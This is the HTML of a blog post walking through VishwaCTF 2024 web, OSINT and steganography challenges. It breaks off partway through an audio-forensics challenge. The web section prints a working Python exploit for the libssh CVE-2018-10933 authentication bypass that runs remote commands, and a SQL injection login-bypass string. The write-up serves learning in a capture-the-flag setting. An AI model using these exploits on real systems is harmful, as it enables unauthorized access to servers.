@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="After long time, over this weekend i participated in a CTF - VishwaCTF-2024, it was beginner freindly CTF where i solved some challenges over there, Below is the writeup for the challenges that I man">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF WriteUp: VishwaCTF 2024">
+<meta property="og:url" content="https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/index.html">
+<meta property="og:site_name" content="sf4ult">
+<meta property="og:description" content="After long time, over this weekend i participated in a CTF - VishwaCTF-2024, it was beginner freindly CTF where i solved some challenges over there, Below is the writeup for the challenges that I man">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/front.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/web/theyarecoming_flag.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/desc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/lyrics.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/thm_desc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/thm_profile.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/ifconfig_desc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/search.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/ips.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/dat_file.gif">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/steg/valorant_desc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/steg/secret_flag.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/steg/sangram_desc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post7/osint/sagar_sangram.gif">
+<meta property="article:published_time" content="2024-03-04T11:21:22.853Z">
+<meta property="article:modified_time" content="2024-03-04T12:17:05.644Z">
+<meta property="article:author" content="Durgesh">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="forensic">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="stegno">
+<meta property="article:tag" content="osint">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post7/front.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF WriteUp: VishwaCTF 2024</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 vazir">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/01/post6/tfcCTF_2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&text=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&is_video=false&description=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: VishwaCTF 2024&body=Check out this article: https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&title=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&name=CTF WriteUp: VishwaCTF 2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2024/03/04/post7/vishwaCTF_2024/&t=CTF WriteUp: VishwaCTF 2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Save-The-City"><span class="toc-number">1.1.</span> <span class="toc-text">Save The City</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trip-To-Us"><span class="toc-number">1.2.</span> <span class="toc-text">Trip To Us</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#They-Are-Coming"><span class="toc-number">1.3.</span> <span class="toc-text">They Are Coming</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">2.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-end-is-beginning"><span class="toc-number">2.1.</span> <span class="toc-text">The end is beginning</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">2.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TRY-HACK-ME"><span class="toc-number">2.2.</span> <span class="toc-text">TRY HACK ME</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Discription"><span class="toc-number">2.2.1.</span> <span class="toc-text">Discription</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ifconfig-inet"><span class="toc-number">2.3.</span> <span class="toc-text">ifconfig_inet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">2.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-CTF"><span class="toc-number">3.</span> <span class="toc-text">Post CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steg"><span class="toc-number">4.</span> <span class="toc-text">Steg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#We-Are-Valorant"><span class="toc-number">4.1.</span> <span class="toc-text">We Are Valorant</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">4.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysterious-Old-Case"><span class="toc-number">4.2.</span> <span class="toc-text">Mysterious Old Case</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">4.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-Code"><span class="toc-number">4.3.</span> <span class="toc-text">Secret Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-7"><span class="toc-number">4.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-1"><span class="toc-number">5.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sagar-Sangram"><span class="toc-number">5.1.</span> <span class="toc-text">Sagar Sangram</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensics"><span class="toc-number">5.2.</span> <span class="toc-text">Forensics</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTF WriteUp: VishwaCTF 2024
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Durgesh</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-04T11:21:22.853Z" class="dt-published" itemprop="datePublished">2024-03-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/forensic/" rel="tag">forensic</a>, <a class="p-category" href="/tags/osint/" rel="tag">osint</a>, <a class="p-category" href="/tags/stegno/" rel="tag">stegno</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/imgs/post7/front.png" alt="front.png"></p>
+<p>After long time, over this weekend i participated in a CTF - VishwaCTF-2024, it was beginner freindly CTF where i solved some challenges over there, Below is the writeup for the challenges that I managed to solve.</p>
+<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/Durge5h/CTFs/tree/main/Competition/VishwaCTF-2024">here</a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Save-The-City"><a href="#Save-The-City" class="headerlink" title="Save The City"></a>Save The City</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!</p>
+</blockquote>
+<p>after opening the site i stumbled upon blank page where was nothing but just “libssh_0.8.1” so i googled exploit for this particular version where i got to know that it is vulnerable to Authentication Bypass (CVE-2018-10933) vuln and got <a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/libssh-bypass-vuln">this</a> page where</p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;13.234.11.113&quot;</span>,<span class="number">31133</span>))</span><br><span class="line">m = paramiko.message.Message()</span><br><span class="line">t = paramiko.transport.Transport(s)</span><br><span class="line">t.start_client()</span><br><span class="line">m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)</span><br><span class="line">t._send_message(m)</span><br><span class="line">c = t.open_session(timeout=<span class="number">5</span>)</span><br><span class="line">c.exec_command(sys.argv[<span class="number">1</span>])</span><br><span class="line">out = c.makefile(<span class="string">&quot;rb&quot;</span>,<span class="number">2048</span>)</span><br><span class="line">output = out.read()</span><br><span class="line">out.close()</span><br><span class="line"><span class="built_in">print</span> (output)</span><br></pre></td></tr></table></figure>
+
+<p>after ls’ing the dir we got the flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py <span class="string">&quot;cat secret.txt/flag.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Trip-To-Us"><a href="#Trip-To-Us" class="headerlink" title="Trip To Us"></a>Trip To Us</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>IIT kharakpur is organizing a US Industrial Visit. The cost of the registration is $1000. But as always there is an opportunity for intelligent minds. Find the hidden login and Get the flag to get yourself a free US trip ticket.</p>
+</blockquote>
+<p>it was typical SQLi bypass challenge, using <strong>admin” or “1”&#x3D;”1”–</strong> as username and password i did able to bypass it.</p>
+<h3 id="They-Are-Coming"><a href="#They-Are-Coming" class="headerlink" title="They Are Coming"></a>They Are Coming</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Aesthetic Looking army of 128 Robots with AGI Capabilities are coming to destroy our locality!</p>
+</blockquote>
+<p>Nothing interesting on home page at first glance, looking at source code got a js file where some bottom portion of code caught my attention after beautifying it </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">yt = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;userRole&quot;</span>, <span class="string">&quot;admin&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;F1ag&quot;</span>, <span class="string">&quot;Open Your Eyes!&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;lastLogin&quot;</span>, <span class="string">&quot;2023-01-01T12:00:00Z&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;theme&quot;</span>, <span class="string">&quot;dark&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;language&quot;</span>, <span class="string">&quot;en_US&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;isLoggedIn&quot;</span>, <span class="string">&quot;true&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;unreadMessages&quot;</span>, <span class="string">&quot;5&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;preferredCurrency&quot;</span>, <span class="string">&quot;USD&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;DivID&quot;</span>, <span class="string">&quot;205&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;Flag&quot;</span>, <span class="string">&quot;Gkul0oJKhNZ1E8nxwnMY8Ljn1KNEW9G9l+w243EQt0M4si+fhPQdxoaKkHVTGjmA&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;AppVer&quot;</span>, <span class="string">&quot;1.0&quot;</span>), (<span class="number">0</span>, vt.<span class="property">jsx</span>)(vt.<span class="property">Fragment</span>, &#123;</span><br><span class="line">           <span class="attr">children</span>: (<span class="number">0</span>, vt.<span class="property">jsxs</span>)(<span class="string">&quot;div&quot;</span>, &#123;</span><br><span class="line">               <span class="attr">className</span>: <span class="string">&quot;hint-main&quot;</span>,</span><br><span class="line">               <span class="attr">children</span>: [(<span class="number">0</span>, vt.<span class="property">jsx</span>)(<span class="string">&quot;h1&quot;</span>, &#123;</span><br><span class="line">                   <span class="attr">className</span>: <span class="string">&quot;hint&quot;</span>,</span><br><span class="line">                   <span class="attr">children</span>: <span class="string">&quot;A Courrpt AI Agent and Its Army of 128 Aesthetic Looking Robots Are Heading Towards Local Vault of the City of Dawn!&quot;</span></span><br><span class="line">               &#125;), (<span class="number">0</span>, vt.<span class="property">jsx</span>)(<span class="string">&quot;p&quot;</span>, &#123;</span><br><span class="line">                   <span class="attr">className</span>: <span class="string">&quot;hint1&quot;</span>,</span><br><span class="line">                   <span class="attr">style</span>: &#123;</span><br><span class="line">                       <span class="attr">display</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">                   &#125;,</span><br><span class="line">                   <span class="attr">children</span>: <span class="string">&quot;I have done 128 cbc tests&quot;</span></span><br><span class="line">               &#125;)]</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;)</span><br><span class="line">   &#125;,</span><br><span class="line">   bt = &#123;</span><br><span class="line">       <span class="attr">hh188</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">       <span class="attr">getKey</span>: <span class="string">&quot;/secret-location&quot;</span></span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>so as we can see here some data being stored on local storage and moreover more interesting one is <strong>Flag</strong> item that has some encrypted value</p>
+<p>hmm, so most probably this one is a real flag that is encrypted using key? , if so which encryption standard and key?.</p>
+<p>so about encryption algorithm we got some hints already, if you look on above code there is <strong>children</strong> key with value <strong>I have done 128 cbc tests</strong> so its most likely AES 128 CBC</p>
+<p>and about key? so if we check <strong>robots.txt</strong> we all sorted out</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin</span><br><span class="line">L3NlY3JldC1sb2NhdGlvbg==</span><br><span class="line">Decryption key: th1s_1s_n0t_t5e_f1a9</span><br></pre></td></tr></table></figure>
+
+<p>now we have Decryption key and cipher as well we are ready to go to this <a target="_blank" rel="noopener" href="https://encode-decode.com/aes-128-cbc-encrypt-online/">site</a> and we got the flag.</p>
+<p><img src="/imgs/post7/web/theyarecoming_flag.png" alt="theyarecoming_flag.png"></p>
+<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="The-end-is-beginning"><a href="#The-end-is-beginning" class="headerlink" title="The end is beginning"></a>The end is beginning</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/osint/desc.png" alt="desc.png"></p>
+<p>searching for</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I’d be gone to my dad  </span><br><span class="line">And ask <span class="keyword">for</span> some cash  </span><br><span class="line">I ran ......</span><br></pre></td></tr></table></figure>
+
+<p>shows me a rap song results, maybe its connected to lyrics of this particular song, so going through lyrics i figured out second portion of flag that is </p>
+<p><img src="/imgs/post7/osint/lyrics.png" alt="lyrics.png"></p>
+<p>and the first part was name of song i.e. <strong>Pradox</strong> so th flag will be</p>
+<p><code>VishwaCTF&#123;Paradox_5000&#125;</code></p>
+<h3 id="TRY-HACK-ME"><a href="#TRY-HACK-ME" class="headerlink" title="TRY HACK ME"></a>TRY HACK ME</h3><h4 id="Discription"><a href="#Discription" class="headerlink" title="Discription"></a>Discription</h4><p><img src="/imgs/post7/osint/thm_desc.png" alt="thm_desc.png"></p>
+<p>as description says one of the team member, i went straight through their official <a target="_blank" rel="noopener" href="https://vishwactf.com/team">page</a> where they have page for thier team members in the bottom</p>
+<p>after checking each member profile with their username one of them have same ranking as mentioned and flag mentioned in description as well.</p>
+<p><img src="/imgs/post7/osint/thm_profile.png" alt="thm_profile.png"></p>
+<h3 id="ifconfig-inet"><a href="#ifconfig-inet" class="headerlink" title="ifconfig_inet"></a>ifconfig_inet</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/osint/ifconfig_desc.png" alt="ifconfig_desc.png"></p>
+<p>hmm, sound familiar though. okay reading all description i searched for this </p>
+<p><img src="/imgs/post7/osint/search.png" alt="search.png"></p>
+<p>as we can see we got some reddit pages that is about some IP address( BTW this challenge is ragarding a famous television series Mr. Robot so if you have watched it, it may give you some insights)</p>
+<p>i got this image </p>
+<p><img src="/imgs/post7/osint/ips.png" alt="ips.png"></p>
+<p>so maybe the highlighted one is what we searching for but still left with the <strong>.dat</strong> file that is first half our flag, searching more gives me this <a target="_blank" rel="noopener" href="https://www.reddit.com/r/MrRobot/comments/km2xo0/ip_address_goof_up/">page</a></p>
+<p>and here some people were talking about IP addresses, reading their chat i got the file name i.e. <strong>fsociety00.dat</strong></p>
+<p><img src="/imgs/post7/osint/dat_file.gif" alt="dat_file.gif"></p>
+<p>so flag is</p>
+<p><code>VishwaCTF&#123;fsociety00.dat_218.108.149.373&#125;</code></p>
+<h2 id="Post-CTF"><a href="#Post-CTF" class="headerlink" title="Post CTF"></a>Post CTF</h2><h2 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a>Steg</h2><h3 id="We-Are-Valorant"><a href="#We-Are-Valorant" class="headerlink" title="We Are Valorant"></a>We Are Valorant</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/steg/valorant_desc.png" alt="valorant_desc.png"></p>
+<p>we have given two file i.e. <strong>we_are_valorant.adts</strong> and <strong>Astra_!!.mp4</strong>, after checking the format of <strong>.adts</strong> using <strong>file</strong> command it shows its <strong>jpg</strong> one</p>
+<p>after changing its magic numbers to jpg it turns out as valorant theme jpg file, i tried getting some info from this file but no use and also uploaded it to the <a target="_blank" rel="noopener" href="https://www.aperisolve.com/">Aperi</a> site but got nothing.</p>
+<p>but when i changed the extension of original one i.e. <strong>we_are_valorant.adts</strong> to .jpg and uploaded it there then there were some Comman Passwords i.g. <strong>Tenz, tenz, From the shadows, Dissipate, dissipate, Kyedae, kyedae</strong></p>
+<p>using <strong>steghide</strong> with first password that is <strong>Tenz</strong> extracts a file <strong>not_a_secret.txt</strong> that contains the flag.</p>
+<p><code>VishwaCTF&#123;you_are_invited_to_the_biggest_valorant_event&#125;</code></p>
+<h3 id="Mysterious-Old-Case"><a href="#Mysterious-Old-Case" class="headerlink" title="Mysterious Old Case"></a>Mysterious Old Case</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>You as a FBI Agent, are working on a old case involving a ransom of $200,000. After some digging you recovered an audio recording.</p>
+</blockquote>
+<p>here we given <strong>final.mp3</strong> and upon checking its exif we got this</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.65</span><br><span class="line">File Name                       : final.mp3</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.6 MB</span><br><span class="line">File Modification Date/Time     : 2024:03:01 23:06:29-05:00</span><br><span class="line">File Access Date/Time           : 2024:03:03 22:21:21-05:00</span><br><span class="line">File Inode Change Date/Time     : 2024:03:01 23:08:07-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : MP3</span><br><span class="line">File Type Extension             : mp3</span><br><span class="line">MIME Type                       : audio/mpeg</span><br><span class="line">MPEG Audio Version              : 1</span><br><span class="line">Audio Layer                     : 3</span><br><span class="line">Audio Bitrate                   : 128 kbps</span><br><span class="line">Sample Rate                     : 44100</span><br><span class="line">Channel Mode                    : Stereo</span><br><span class="line">MS Stereo                       : Off</span><br><span class="line">Intensity Stereo                : Off</span><br><span class="line">Copyright Flag                  : False</span><br><span class="line">Original Media                  : False</span><br><span class="line">Emphasis                        : None</span><br><span class="line">ID3 Size                        : 320209</span><br><span class="line">Title                           : Unknown</span><br><span class="line">Artist                          : Anonymous</span><br><span class="line">Track                           : 727/305</span><br><span class="line">Album                           : Cooper</span><br><span class="line">Recording Time                  : 1971</span><br><span class="line">Genre                           : the zip file is 100 MB not 7 GB</span><br><span class="line">Original Release Time           : 0001</span><br><span class="line">Band                            : DB Cooper</span><br><span class="line">Comment                         : password <span class="keyword">for</span> the zip is all lowecase with no spaces</span><br><span class="line">User Defined URL                : https://drive.google.com/file/d/1bkuZRLKOGWB7tLNBseWL34BoyI379QbF/view?usp=drive_lin</span><br><span class="line">User Defined Text               : (purl) https://drive.google.com/file/d/1bkuZRLKOGWB7tLNBseWL34BoyI379QbF/view?usp=drive_lin</span><br><span class="line">Picture MIME Type               : image/jpeg</span><br><span class="line">Picture Type                    : Front Cover</span><br><span class="line">Picture Description             : Front Cover</span><br><span class="line">Picture                         : (Binary data 158421 bytes, use -b option to extract)</span><br><span class="line">Date/Time Original              : 1971</span><br><span class="line">Duration                        : 0:02:22 (approx)</span><br></pre></td></tr></table></figure>
+
